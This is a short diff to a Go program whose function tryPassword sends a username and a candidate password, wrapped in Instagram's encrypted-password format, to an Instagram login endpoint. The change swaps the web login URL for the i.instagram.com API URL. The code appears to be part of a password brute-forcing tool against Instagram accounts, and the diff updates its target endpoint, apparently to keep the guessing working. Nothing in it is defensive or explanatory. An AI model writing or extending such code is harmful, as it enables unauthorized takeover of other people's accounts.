@@ -12,7 +12,7 @@ import (
 )
 
 func tryPassword(username, password string) bool {
-    loginURL := "https://www.instagram.com/accounts/login/ajax/"
+    loginURL := "https://i.instagram.com/api/v1/"
     data := url.Values{}
     data.Set("enc_password", "#PWD_INSTAGRAM_BROWSER:10:1748019955:"+password)
     data.Set("username", username)
